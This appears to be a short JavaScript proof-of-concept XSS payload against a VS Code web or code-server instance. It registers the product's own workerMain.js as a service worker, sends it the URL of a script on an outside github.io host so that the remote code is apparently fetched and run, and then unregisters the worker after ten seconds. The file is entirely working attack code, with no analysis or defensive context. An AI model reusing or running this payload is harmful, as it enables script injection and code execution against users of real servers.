console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)

const r_promise = navigator.serviceWorker.register("/stable-de65bfc9477f61bc22d0b1a23085d1f18bb25202/static/out/vs/base/worker/workerMain.js")
r_promise.then((registration) => {
    console.log("Registered worker");
    console.log(registration)
    globalThis.r = registration;

    let serviceWorker;
    if (registration.installing) {
        serviceWorker = registration.installing;
    } else if (registration.waiting) {
        serviceWorker = registration.waiting;
    } else if (registration.active) {
        serviceWorker = registration.active;
    }

    serviceWorker.postMessage("//sudistark.github.io/4.js");
    setTimeout(()=>{
        navigator.serviceWorker.getRegistrations().then(registrations => {
    for (const registration of registrations) {
        registration.unregister();
    } 
});
    },10000)
})
